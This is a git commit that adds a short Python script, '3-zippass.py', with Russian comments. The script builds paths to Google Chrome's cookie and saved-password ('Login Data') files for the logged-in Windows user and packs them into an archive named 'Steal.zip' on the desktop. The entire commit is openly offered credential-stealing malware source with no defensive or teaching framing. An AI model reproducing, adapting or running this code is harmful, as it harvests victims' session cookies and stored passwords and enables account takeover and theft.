b700ae6d25d94fa94a2bb04caca8a79c1f2bd7ba
nrvnrv <nrvnsk@mail.ru>
2021-11-05 08:48:27 +0300

    0

---
+++ 3-zippass.py
@@ -0,0 +1,35 @@
+import os.path
+import zipfile 
+from os import getlogin
+
+ 
+def main():
+ 
+ if (os.path.exists(GoogleChrome_Path)): # Проверка наличия Куки Google Chrome
+ 
+  zip_file = zipfile.ZipFile(r'C:\\Users\\' + user_name + '\\Desktop\\Steal.zip', 'w') # Создаем новый C:\\Steal.zip
+ 
+  zip_file.write(GoogleChrome_Cookies) # Помещаем куки файлы в архив
+ 
+  zip_file.write(GoogleChrome_Passwords) # Помещаем пароли в архив
+ 
+  zip_file.close() # Закрытие архива
+ 
+ else:
+ 
+  print('ERROR!') # Если Куки Google Chrome нет, то выводится "ERROR!"
+ 
+ 
+ 
+ 
+# Запуск функции main()
+ 
+if __name__ == '__main__':
+ user_name = getlogin() # Получаем имя пользователя
+# Составляем полный путь для Google Chrome
+ GoogleChrome_Path = 'C:\\Users\\' + user_name + '\\AppData\\Local\\Google\\Chrome\\User Data\\Safe Browsing Cookies'
+# Составляем полный путь Cookies файлов Google Chrome
+ GoogleChrome_Cookies = 'C:\\Users\\' + user_name + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
+# Составляем полный путь файлов с паролями Google Chrome
+ GoogleChrome_Passwords = 'C:\\Users\\' + user_name + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+ main()
